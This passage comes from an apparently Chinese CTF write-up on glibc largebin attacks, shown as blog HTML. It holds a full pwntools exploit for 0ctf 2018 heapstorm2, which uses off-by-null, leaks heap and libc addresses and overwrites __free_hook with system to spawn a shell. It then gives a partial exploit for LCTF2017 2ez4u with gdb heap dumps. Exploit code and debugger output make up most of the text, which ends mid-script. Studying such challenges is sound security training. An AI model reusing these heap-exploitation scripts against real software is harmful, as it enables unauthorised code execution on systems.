class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line"> </span><br><span class="line">libc_path = <span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span></span><br><span class="line">elf_path = <span class="string">"./0ctf_2018_heapstorm2"</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line"><span class="comment">#io = remote("node3.buuoj.cn",26000)</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">'1'</span>:</span><br><span class="line">    context(log_level = <span class="string">'debug'</span>,terminal= <span class="string">'/bin/zsh'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>]==<span class="string">'0'</span>:</span><br><span class="line">    context(log_level = <span class="string">'info'</span>,terminal= <span class="string">'/bin/zsh'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#io = process([elf_path],env=&#123;"LD_PRELOAD":libc_path&#125;)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cho=<span class="string">'Command: '</span>      <span class="comment"># choice提示语</span></span><br><span class="line">siz=<span class="string">'Size: '</span>     <span class="comment"># size输入提示语</span></span><br><span class="line">con=<span class="string">'Content: '</span>         <span class="comment"># content输入提示语</span></span><br><span class="line">ind=<span class="string">'Index: '</span>      <span class="comment"># index输入提示语</span></span><br><span class="line">edi=<span class="string">''</span>          <span class="comment"># edit输入提示语</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">'1'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(siz,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index,c=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index,c=<span class="string">'4'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content=<span class="string">''</span>,c=<span class="string">'2'</span>)</span>:</span></span><br><span class="line">    sal(cho,c)</span><br><span class="line">    sal(ind,str(index))</span><br><span class="line">    sal(siz,str(len(content)))</span><br><span class="line">    sa(con,content)</span><br><span class="line"><span class="comment"># 获取pie基地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proc_base</span><span class="params">(p)</span>:</span></span><br><span class="line">    proc_base = p.libs()[p._cwd+p.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    info(hex(proc_base))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取libc基地址   </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base</span><span class="params">(p)</span>:</span></span><br><span class="line">    libc_base = p.libs()[libc_path]</span><br><span class="line">    info(hex(libc_base)) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># get_proc_base(io)</span></span><br><span class="line">        <span class="comment"># get_libc_base(io)</span></span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io = process(elf_path) </span><br><span class="line">        <span class="comment">#io = remote("node3.buuoj.cn",29327)</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 0</span></span><br><span class="line">        add(<span class="number">0x508</span>)                  <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 2</span></span><br><span class="line">        edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))        <span class="comment"># 设置fake_pre_size</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 3</span></span><br><span class="line">        add(<span class="number">0x508</span>)                  <span class="comment"># 4</span></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 5</span></span><br><span class="line">        edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))        <span class="comment"># 设置fake_pre_size</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 6</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        edit(<span class="number">0</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>))              <span class="comment"># 对free后的1做off-by-null,造成chunk收缩</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)                  <span class="comment"># 7     # 将0ff-by-null收缩后的freechunk分两次申请出来</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)                             <span class="comment"># 触发后向合并:0x508+0x18</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将合并后大小为0x538的freechunk重新构造成0x38和0x4e8</span></span><br><span class="line">        add(<span class="number">0x38</span>)                   <span class="comment"># 1</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)                  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        edit(<span class="number">3</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">        add(<span class="number">0x18</span>)                   <span class="comment"># 4</span></span><br><span class="line">        add(<span class="number">0x4d8</span>)                  <span class="comment"># 8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)                     <span class="comment"># 后向合并造出0x530的freechunk</span></span><br><span class="line">        add(<span class="number">0x48</span>)                   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)                     <span class="comment"># unsortbin: 0x100203060 (size : 0x4f0) &lt;--&gt; 0x1002035c0 (size : 0x4e0)</span></span><br><span class="line">        add(<span class="number">0x4e8</span>)                  <span class="comment"># 2</span></span><br><span class="line">        free(<span class="number">2</span>)                     <span class="comment"># 把0x4f0的放回到unsortedbin</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        storage = <span class="number">0x13370800</span></span><br><span class="line">        fake_chunk = storage<span class="number">-0x20</span></span><br><span class="line">        p1 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x4f1</span>)+p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">        edit(<span class="number">7</span>,p1)                  <span class="comment"># 劫持unsortfbin中chunk的bk指针指向fakechunk</span></span><br><span class="line"></span><br><span class="line">        p2 = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">        p2 += p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)          <span class="comment"># 劫持在largebin中chunk的bk指针避免unlink时崩溃</span></span><br><span class="line">        p2 +=  p64(<span class="number">0</span>)+p64(fake_chunk<span class="number">-0x18</span><span class="number">-4</span>)    <span class="comment"># 劫持在largebin中chunk的bk_nextsize指针</span></span><br><span class="line">        edit(<span class="number">8</span>,p2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>)       <span class="comment"># 2,largebin attack触发,返回我们伪造位置的节点</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        p3 = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage)<span class="comment">#构造show函数的条件</span></span><br><span class="line">        edit(<span class="number">2</span>,p3)</span><br><span class="line">        </span><br><span class="line">        pause()</span><br><span class="line">        p4 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(storage<span class="number">-0x20</span>+<span class="number">3</span>)+p64(<span class="number">8</span>)</span><br><span class="line">        edit(<span class="number">0</span>,p4)      <span class="comment"># 重新回写table，改掉对应表项为真实的ptr-size，而非异或后的，同时改那表头四个随机数为0，这样我们在xor的时候返回的就是地址/size真正的值了。</span></span><br><span class="line"></span><br><span class="line">        show(<span class="number">1</span>)         <span class="comment"># 输出我们largebin attack错位写在fakechunk上的地址来那道heap地址</span></span><br><span class="line">        r(<span class="number">11</span>)</span><br><span class="line">        heap = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        info(<span class="string">"heap:"</span>+hex(heap))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p5 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(heap+<span class="number">0x10</span>)+p64(<span class="number">8</span>)    <span class="comment">#泄露main_arena</span></span><br><span class="line">        edit(<span class="number">0</span>,p5)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#shell()</span></span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        libc_base =  int(u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))<span class="number">-88</span>-libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">     </span><br><span class="line">        system = libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">        free_hook = libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        <span class="keyword">print</span> (hex(system),hex(free_hook))</span><br><span class="line">        p6 =  p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+p64(storage)+p64(<span class="number">0x1000</span>)+p64(free_hook)+p64(<span class="number">0x1000</span>)+p64(storage+<span class="number">0x50</span>)+p64(<span class="number">0x100</span>)+<span class="string">'/bin/sh\x00'</span></span><br><span class="line">        edit(<span class="number">0</span>,p6)</span><br><span class="line">        edit(<span class="number">1</span>,p64(system))</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        shell()</span><br><span class="line">        pause()  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h1 id="例题2：LCTF2017-2ez4u-取出时攻击"><a href="#例题2：LCTF2017-2ez4u-取出时攻击" class="headerlink" title="例题2：LCTF2017-2ez4u(取出时攻击)"></a>例题2：LCTF2017-2ez4u(取出时攻击)</h1><h2 id="题目概览-1"><a href="#题目概览-1" class="headerlink" title="题目概览"></a>题目概览</h2><ol>
<li>uaf，并且free后连表中指针也不清空，可以edit和show</li>
<li>show的时候从addr+0x18开始，刚好跳过了fd和bk指针，所以没法利用在unsortedbin里的show出来，而是需要拉入largebin用nextsize指针。<img src="https://s1.ax1x.com/2020/08/30/dbzAk6.png" alt></li>
</ol>
<h2 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>其实主要就是伪造一系列的结构，感觉这个比之前的那个要麻烦一些</p>
<p>一开始的largebin情况如下：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">largebin[ <span class="number">0</span>]: <span class="number">0xdf51549c30</span> (size : <span class="number">0x410</span>) &lt;--&gt; <span class="number">0xdf515497e0</span> (size : <span class="number">0x400</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>以下这张图充分还原了largebin的攻击过程，达到一次任意地址申请+overlap</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/30/dqR2A1.png" alt></p>
<hr>
<p>我们再将两个0x80的放入fastbin连接起来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 把两个0x80大小的放进fastbin</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x8f90b03180</span> --&gt; <span class="number">0x8f90b03300</span> --&gt; <span class="number">0x0</span>	#此时偏移为<span class="number">0x180</span>的chunk有指向<span class="number">0x300</span>的指针</span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x8f90b044b0</span> (size : <span class="number">0x1fb50</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0x8f90b03000</span></span><br><span class="line">         largebin[ <span class="number">0</span>]: <span class="number">0x8f90b03c30</span> (invaild memory)</span><br></pre></td></tr></table></figure>

<p>当我们再进行一次add的时候：<strong>首先把fastbin中的chunk放入smallbin；然后触发largebin attack申请出我们伪造的fakechunk</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3f0</span>,<span class="string">'b'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>))<span class="comment"># deadbeaf是用来填充size的，防止输出的时候00截断</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0xb4d2f9b300</span>  &lt;--&gt; <span class="number">0xb4d2f9b180</span> (size error (<span class="number">0xdeadbeefdeadbee8</span>)) &lt;--&gt; <span class="number">0xb4d2f9b000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4fe6dfe040</span>:   <span class="number">0x0000040000000001</span>      <span class="number">0x0000004fe6e000a0</span></span><br><span class="line"><span class="number">0x4fe6dfe050</span>:   <span class="number">0x0000006000000001</span>      <span class="number">0x0000004fe6dff090</span></span><br><span class="line"><span class="number">0x4fe6dfe060</span>:   <span class="number">0x0000006000000001</span>      <span class="number">0x0000004fe6dff110</span></span><br><span class="line"><span class="number">0x4fe6dfe070</span>:   <span class="number">0x000003f000000001</span>      <span class="number">0x0000004fe6dff140</span>		&lt;-----可以看到已经把fakechunk申请出来了</span><br></pre></td></tr></table></figure>

<p>smallbin也是头插尾取，再add一次，取出smallbin的最后一个：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'6'</span><span class="number">*0</span>x60)</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">0x080</span>)  smallbin[ <span class="number">6</span>]: <span class="number">0xda50dfb300</span>  &lt;--&gt; <span class="number">0xda50dfb180</span> (size error (<span class="number">0xdeadbeefdeadbee8</span>))</span><br><span class="line">         largebin[ <span class="number">0</span>]: <span class="number">0xda50dfbc30</span> (invaild memory)</span><br></pre></td></tr></table></figure>

<p><strong>此时在smallbin中的chunk里有指向main_arena的指针，且这个chunk刚好在我们的fakechunk下面不远，直接可以show出来</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/31/dLvU2D.png" alt></p>
<p>之后我们手动恢复chunk结构。</p>
<p>最后使用fastbin attack劫持unsortbin中的top chunk指向free_hook-0xb58,然后改freehook为system。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.terminal = <span class="string">'/bin/zsh'</span></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment">#7 playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> ) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment">#9 sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> ) <span class="comment">#0xa</span></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment">#0xb victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> ) <span class="comment">#0xc</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># 劫持在latgebin中的victim的bk_nextsize指针指向：HEAP+0x130</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target构造unlink时的表结构</span></span><br><span class="line"></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span 